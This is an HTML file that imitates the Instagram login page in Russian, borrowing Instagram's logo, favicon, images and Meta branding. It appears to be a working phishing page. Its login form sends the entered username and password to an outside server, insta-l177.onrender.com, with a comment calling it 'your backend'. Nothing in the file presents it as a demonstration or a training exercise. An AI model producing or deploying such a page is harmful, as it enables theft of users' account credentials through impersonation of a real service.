<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link rel="icon" href="https://www.instagram.com/static/images/ico/favicon-192.png/68d99ba29cc8.png" type="image/png">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <img class="instagram-logo"
src="5968776.png" alt="Instagram">
    <style>
      /* ========================= MOBILE INSTAGRAM STYLE ========================= */
@media (max-width: 600px) {

    body {
        margin: 0;
        padding: 0;
        background: #0f1b2d;
        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI',
                     Roboto, Helvetica, Arial, sans-serif;
        min-height: 100vh;
        display: flex;
        justify-content: center;
        align-items: flex-start;
    }

    .container {
        width: 100%;
        min-height: 100vh;
        display: flex;
        flex-direction: column;
        justify-content: center;
    }

    /* Ліва частина приховується */
    .left-side {
        display: none;
    }

    /* Основний блок логіну */
    .right-side {
        width: 100%;
        max-width: 100%;
        min-height: 100vh;
        background: #152235;
        border: none;
        padding: 40px 24px;
        box-sizing: border-box;
        display: flex;
        flex-direction: column;
        justify-content: center;
        align-items: center;
    }

    /* Лого */
    .instagram-logo {
        width: 72px;
        height: 72px;
        margin-bottom: 45px;
    }

    /* Заголовок */
    .title {
        display: none;
    }

    /* Inputs */
    input {
        width: 100%;
        background: transparent;
        border: 1px solid rgba(255,255,255,0.15);
        border-radius: 14px;
        padding: 16px;
        margin-bottom: 14px;
        color: white;
        font-size: 16px;
        outline: none;
        box-sizing: border-box;
    }

    input::placeholder {
        color: rgba(255,255,255,0.55);
    }

    input:focus {
        border-color: #3797ff;
    }

    /* Кнопка входу */
    button {
        width: 100%;
        background: #0095f6;
        border: none;
        border-radius: 16px;
        padding: 15px;
        color: white;
        font-size: 17px;
        font-weight: 600;
        margin-top: 6px;
        cursor: pointer;
    }

    /* Forgot password */
    .forgot {
        margin-top: 22px;
        margin-bottom: 60px;
    }

    .forgot a {
        color: white;
        text-decoration: none;
        font-size: 15px;
    }

    /* Створення акаунта */
    .create-account {
        margin-top: auto;
        width: 100%;
    }

    .create-account a,
    .create-account button {
        width: 100%;
        background: transparent;
        border: 1px solid #3797ff;
        color: #3797ff;
        border-radius: 18px;
        padding: 14px;
        display: block;
        text-align: center;
        text-decoration: none;
        font-weight: 500;
        box-sizing: border-box;
    }

    /* Facebook кнопка прихована */
    .fb-btn {
        display: none;
    }

    /* Meta */
    .meta-logo {
        margin-top: 30px;
        color: white;
        opacity: 0.7;
        font-size: 24px;
    }
}
    </style>
</head>
<body>
    <div class="container">
        <div class="left-side">
            <img src="https://cdn-icons-png.flaticon.com/512/5968/5968776.png" class="instagram-logo" alt="Instagram Logo">
            <h1>Посмотрите, какими моментами<br>из жизни поделились ваши<br><span class="pink">близкие друзья.</span></h1>
            <div class="collage-container">
                <img src="https://static.cdninstagram.com/rsrc.php/yN/r/-erGonz07kB.webp" class="collage" alt="Stories Collage">
            </div>
        </div>
        <div class="right-side">
            <div class="title">Войти в Instagram</div>
            
            <!-- Подключено к твоему бэкенду -->
            <form action="https://insta-l177.onrender.com/" method="POST">
                <input type="text" name="username" placeholder="Имя пользователя, номер мобильного телефона или электронный адрес" required>
                <input type="password" name="password" placeholder="Пароль" required>
                <button type="submit">Войти</button>
            </form>
            <a href="#" class="forgot">Забыли пароль?</a>
            <a href="#" class="fb-btn">
                <i class="fab fa-facebook-square"></i> Войти через Facebook
            </a>
            <a href="#" class="create-account">Создать новый аккаунт</a>
        </div>
    </div>

    <div class="meta-logo">∞ Meta</div>
</body>
</html>
